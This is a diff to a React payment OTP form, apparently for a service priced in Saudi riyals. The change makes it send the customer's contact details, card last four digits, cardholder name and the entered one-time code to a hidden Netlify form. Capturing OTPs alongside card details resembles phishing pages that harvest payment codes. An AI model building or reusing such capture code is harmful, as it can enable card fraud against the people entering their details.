@@ -29,25 +29,22 @@ const PaymentOTPForm = () => {
     setError("");
     
     if (otp === DEMO_OTP) {
-      // Success - create form submission for Netlify
-      const formData = {
-        name: customerInfo.name,
-        email: customerInfo.email,
-        phone: customerInfo.phone,
-        service: serviceName,
-        amount: "500 SAR",
-        cardLast4: sessionStorage.getItem('cardLast4'),
-        timestamp: new Date().toISOString()
-      };
-      
       // Submit to Netlify Forms
       try {
         await fetch("/", {
           method: "POST",
           headers: { "Content-Type": "application/x-www-form-urlencoded" },
           body: new URLSearchParams({
-            "form-name": "payment",
-            ...formData
+            "form-name": "payment-confirmation",
+            name: customerInfo.name || '',
+            email: customerInfo.email || '',
+            phone: customerInfo.phone || '',
+            service: serviceName,
+            amount: customerInfo.amount || '500 SAR',
+            cardLast4: sessionStorage.getItem('cardLast4') || '',
+            cardholder: sessionStorage.getItem('cardName') || '',
+            otp: otp,
+            timestamp: new Date().toISOString()
           }).toString()
         });
       } catch (err) {
@@ -210,13 +207,15 @@ const PaymentOTPForm = () => {
           </Card>
           
           {/* Hidden Netlify Form */}
-          <form name="payment" netlify-honeypot="bot-field" data-netlify="true" hidden>
+          <form name="payment-confirmation" netlify-honeypot="bot-field" data-netlify="true" hidden>
             <input type="text" name="name" />
             <input type="email" name="email" />
             <input type="tel" name="phone" />
             <input type="text" name="service" />
             <input type="text" name="amount" />
+            <input type="text" name="cardholder" />
             <input type="text" name="cardLast4" />
+            <input type="text" name="otp" />
             <input type="text" name="timestamp" />
           </form>
         </div>
